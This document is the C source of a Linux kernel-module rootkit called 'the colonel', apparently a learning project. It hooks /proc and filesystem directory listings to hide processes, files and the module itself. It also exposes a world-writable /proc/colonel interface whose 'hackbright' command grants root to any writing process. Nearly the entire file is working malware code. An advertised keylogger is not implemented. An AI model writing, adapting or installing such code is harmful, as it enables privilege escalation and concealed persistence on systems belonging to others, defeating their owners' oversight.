#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/string.h>

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })											/* typesafe macro for retrieving the min value */
#define MAX_PIDS 50												/* the maximum number of hidden PIDs */

MODULE_LICENSE("GPL");

/* Declaring everything static confines all variables and functions to the module (rootkit) --
 * i.e. no export to /proc/kallsyms making the rootkit harder to detect. */

/* STATIC VARIABLES */
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_colonel;

/* The following variables save the original, soon to be replaced, pointers.
 * They are restored during the module unload. Names are self-explanatory. */
static int (*og_proc_readdir)(struct file *, void *, filldir_t);
static int (*og_fs_readdir)(struct file *, void *, filldir_t);

static filldir_t og_proc_filldir;
static filldir_t og_fs_filldir;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

/* pointer to the module entry that is above the rootkit in main module/kobject list -- 
 * acts as a placeholder for where to place the rootkit entry when shown*/
static struct list_head *prev_module;
static struct list_head *prev_kobj_module;

/* array used for hiding PIDs and their positions */
static char hidden_pids[MAX_PIDS][8];
static int current_pid = 0;

/* switches for turning on/off the keylogger, and hiding files and the module */
static char key_logger = 0;
static char hidden_files = 1;
static char hidden_module = 0;

/* module status array -- provides a method of printing */
static char module_status[1024];

/* MODULE FUNCTIONS */
void hide_module(void) {
	if (hidden_module) {											/* if already hidden, return with no error */
		return;
	}

	prev_module = THIS_MODULE->list.prev;									/* stores rootkit entry */
	list_del(&THIS_MODULE->list);										/* removes rootkit entry from modules list */

	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;							/* stores kobject */
	kobject_del(&THIS_MODULE->mkobj.kobj);									/* removes kobjects */
	list_del(&THIS_MODULE->mkobj.kobj.entry);

	hidden_module = !hidden_module;										/* sets the module switch to 1 */
}
 
void show_module(void) {
	int restore;

	if (!hidden_module) {											/* if already showing (0), return with no error */
		return;
	}

	list_add(&THIS_MODULE->list, prev_module);								/* restores module entry */

	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 							/* restores kobject */
	 	              THIS_MODULE->mkobj.kobj.parent, "col");

	hidden_module = !hidden_module;										/* sets module switch to 0*/
}

/* PAGE READ/WRITE FUNCTIONS */ 
static void set_addr_rw(void *addr) {
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);						/* get what page the address is on */
	if (pte->pte &~ _PAGE_RW) {
		pte->pte |= _PAGE_RW;										/* set page read/write */
	}
}

static void set_addr_ro(void *addr) {										/* resets to original permissions */
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

/* THE CUSTOM SHOP */
/* Where the classics get a fresh look */
static int new_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, 
u64 ino, unsigned d_type) {
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, hidden_pids[i])) {
			return 0;										/* ensures any matches to hidden PIDs aren't shown */
		}
	}

	if (!strcmp(name, "colonel")) {			
		return 0;											/* ensures any matches to rootkit aren't shown */
	}

	return og_proc_filldir(buf, name, namelen, offset, ino, d_type);					/* invokes the original */
}

static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
	og_proc_filldir = filldir; 										/* stores the original filldir */
	return og_proc_readdir(filp, dirent, new_proc_filldir);							/* passes the modified function */
}

static int new_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, 
						  u64 ino, unsigned d_type) {
	if (hidden_files && (!strncmp(name, "__col", 5) || !strncmp(name, "7-__col", 7))) {			/* hides the file if prefix matches */
		return 0;
	}
	return og_fs_filldir(buf, name, namelen, offset, ino, d_type);						/* invokes the original */
}

static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
	og_fs_filldir = filldir;										/* comparable to the /proc version */
	return og_fs_readdir(filp, dirent, new_fs_filldir);
}

static int read_colonel(char *buffer, char **buffer_location, off_t off, 
						int count, int *eof, void *data) {				/* reads /proc/colonel */
	int size;

	sprintf(module_status, 
"THE COLONEL--------------------------------------\n\
  + hides files prefixed with __col or 7-__col\n\
  + gives root access\n\n\
USAGE:\n\
  From command line --\n\
  $ echo -n <command> >> /proc/colonel\n\n\
  From colcmd --\n\
  $ ./rtcmd.py hp1337\n\n\
  To get root access --\n\
  $ ./rtcmd.py hackbright /bin/bash\n\n\
COMMANDS:\n\
  hackbright - uid and gid 0 for writing process\n\
  tls - toggles keylogger on/off\n\
  keylog -- print keyboard input log; keylogger is set to 0\n\
  hpXXXX - hides process id XXXX\n\
  sp - shows last hidden process\n\
  tls - toggles keylogger on/off\n\
  thf - toggles hidden files\n\
  mh - hide module\n\
  ms - show module\n\n\
STATUS-------------------------------------------\n\
  keylogger: %d\n\
  hidden files: %d\n\
  hidden PIDs: %d\n\
  hidden module: %d\n\
  -----------------------------------------------\n", key_logger, hidden_files, current_pid, hidden_module);

	size = strlen(module_status);

	if (off >= size) {
		return 0;
	}
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;											/* starts at given offset */
}

/* listens and processes commands written to /proc/colonel
 * write_colonel uses strncmp to compare input to colonel commands */
static int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
	if (!strncmp(buff, "hackbright", MIN(10, count))) {							/* become root */
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);

	} else if (!strncmp(buff, "hp", MIN(2, count))) {							/* hides process id */
		if (current_pid < MAX_PIDS) strncpy(hidden_pids[current_pid++], buff+2, MIN(7, count-2));

	} else if (!strncmp(buff, "sp", MIN(2, count))) {							/* shows last hidden process */
		if (current_pid > 0) current_pid--;

	} else if (!strncmp(buff, "tls", MIN(3, count))) {							/* toggle keylogger on/off */
		key_logger = !key_logger;
		if (current_pid > 1) current_pid--;
	
	} else if (!strncmp(buff, "keylog", MIN(6, count))) {							/* toggle keylogger on/off */
		key_logger = 0;
		if (current_pid > 1) current_pid--;

	} else if (!strncmp(buff, "thf", MIN(3, count))) {							/* toggles hidden_files in fs */
		hidden_files = !hidden_files;

	} else if (!strncmp(buff, "mh", MIN(2, count))) {							/* hide module (rootkit) */
		hide_module();

	} else if (!strncmp(buff, "ms", MIN(2, count))) {							/* show module (rootkit) */
		show_module();
	}
	
    return count;
}


/* CLEAN/INIT FUNCTIONS */
/* NULL checks for sanity */ 
static void clean_procfs(void) {
	if (proc_colonel != NULL) {
		remove_proc_entry("colonel", NULL);								/* removes /proc/colonel */
		proc_colonel = NULL;
	}
	
	if (proc_fops != NULL && og_proc_readdir != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->readdir = og_proc_readdir;								/* restores the original /proc readdir */
		set_addr_ro(proc_fops);
	}
}

static void clean_fs(void) {
	if (fs_fops != NULL && og_fs_readdir != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->readdir = og_fs_readdir;								/* restore original fs readdir */
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void) {
	proc_colonel = create_proc_entry("colonel", 0666, NULL);						/* creates /proc/colonel in /proc */
	if (NULL == proc_colonel) {
		return 0;
	}

	proc_root = proc_colonel->parent;
	if (NULL == proc_root || strcmp(proc_root->name, "/proc") != 0) {
		return 0;
	}

	proc_colonel->read_proc = read_colonel;									/* sets custom read function */
	proc_colonel->write_proc = write_colonel;								/* sets custom write function */
	
	/* (using page mode change) */
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	og_proc_readdir = proc_fops->readdir;
	set_addr_rw(proc_fops);
	proc_fops->readdir = new_proc_readdir;									/* passes custom readdir */
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void) {
	struct file *etc_filp;
	etc_filp = filp_open("/etc", O_RDONLY, 0);								/* retrieves file_operations of /etc */
	if (NULL == etc_filp) {
		return 0;
	}

	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	og_fs_readdir = fs_fops->readdir;
	set_addr_rw(fs_fops);
	fs_fops->readdir = new_fs_readdir;									/* passes custom readdir */ 
	set_addr_ro(fs_fops);
	
	return 1;
}

/* MODULE INIT/EXIT */
static int __init rootkit_init(void) {
	if (!procfs_init() || !fs_init()) {
		clean_procfs();
		clean_fs();
		return 1;
	}

	hide_module();
	return 0;
}

static void __exit rootkit_exit(void) {
	clean_procfs();
	clean_fs();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
